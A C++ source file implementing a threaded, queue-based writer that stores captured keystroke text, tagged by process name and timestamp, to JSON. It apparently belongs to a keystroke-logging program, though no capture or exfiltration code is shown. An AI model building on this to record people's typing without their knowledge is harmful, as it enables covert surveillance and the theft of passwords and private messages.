#include "LogWriter.h"
#include "JsonLog.h" // existing synchronous writer helpers
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>

struct LogItem {
    std::wstring process;
    std::wstring text;
    std::time_t timestamp;
};

namespace {
    std::mutex              g_queueMutex;
    std::condition_variable g_cv;
    std::queue<LogItem>     g_queue;
    std::atomic<bool>       g_running{false};
    std::thread             g_worker;
}

void LogWriter_Init() {
    try {
        if (g_running.exchange(true)) return; // already running
        
        g_worker = std::thread([](){
            while (g_running.load()) {
                try {
                    std::unique_lock<std::mutex> lk(g_queueMutex);
                    g_cv.wait(lk, [](){ return !g_running.load() || !g_queue.empty(); });
                    
                    while (!g_queue.empty()) {
                        LogItem item = std::move(g_queue.front());
                        g_queue.pop();
                        lk.unlock();
                        
                        try {
                            // Perform synchronous write using existing function
                            WriteKeystrokeToJson(item.process, item.text, item.timestamp);
                        }
                        catch (const std::exception& e) {
                            // Log write failed - continue with next item
                            // Could add error logging here if needed
                        }
                        
                        lk.lock();
                    }
                }
                catch (const std::exception& e) {
                    // Handle thread-level errors, continue running
                }
            }
            
            // Flush remaining items on shutdown
            try {
                while (true) {
                    std::unique_lock<std::mutex> lk2(g_queueMutex);
                    if (g_queue.empty()) break;
                    LogItem item = std::move(g_queue.front());
                    g_queue.pop();
                    lk2.unlock();
                    
                    try {
                        WriteKeystrokeToJson(item.process, item.text, item.timestamp);
                    }
                    catch (const std::exception& e) {
                        // Ignore errors during shutdown flush
                    }
                }
            }
            catch (const std::exception& e) {
                // Handle shutdown errors gracefully
            }
        });
    }
    catch (const std::exception& e) {
        // Failed to start worker thread
        g_running.store(false);
    }
}

void LogWriter_Shutdown() {
    try {
        if (!g_running.exchange(false)) return;
        g_cv.notify_all();
        if (g_worker.joinable()) g_worker.join();
    }
    catch (const std::exception& e) {
        // Handle shutdown errors gracefully
    }
}

void LogWriter_Enqueue(const std::wstring& process, const std::wstring& text, std::time_t timestamp) {
    try {
        if (!g_running.load()) { 
            try {
                WriteKeystrokeToJson(process, text, timestamp); 
            }
            catch (const std::exception& e) {
                // Direct write failed, ignore
            }
            return; 
        }
        
        {
            std::lock_guard<std::mutex> lk(g_queueMutex);
            g_queue.push(LogItem{process, text, timestamp});
        }
        g_cv.notify_one();
    }
    catch (const std::exception& e) {
        // Enqueue failed - try direct write as fallback
        try {
            WriteKeystrokeToJson(process, text, timestamp);
        }
        catch (const std::exception& inner_e) {
            // Both enqueue and direct write failed - ignore
        }
    }
}
